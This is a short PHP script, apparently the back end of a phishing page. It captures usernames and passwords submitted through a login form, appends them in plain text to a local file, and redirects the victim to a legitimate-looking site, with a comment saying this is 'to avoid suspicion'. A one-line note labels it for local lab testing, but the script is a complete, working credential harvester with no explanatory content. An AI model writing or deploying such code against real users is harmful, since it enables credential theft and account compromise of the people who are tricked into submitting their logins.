<?php
// WARNING: This is for local lab testing only.
$username = $_POST['username'];
$password = $_POST['password'];

// Format the data for logging
$data = "User: " . $username . " | Pass: " . $password . "\n";

// Append the data to a local text file
file_put_contents("passwords.txt", $data, FILE_APPEND);

// Redirect the user to the real site to avoid suspicion
header("Location: https://wwww.example.com");
exit();
?>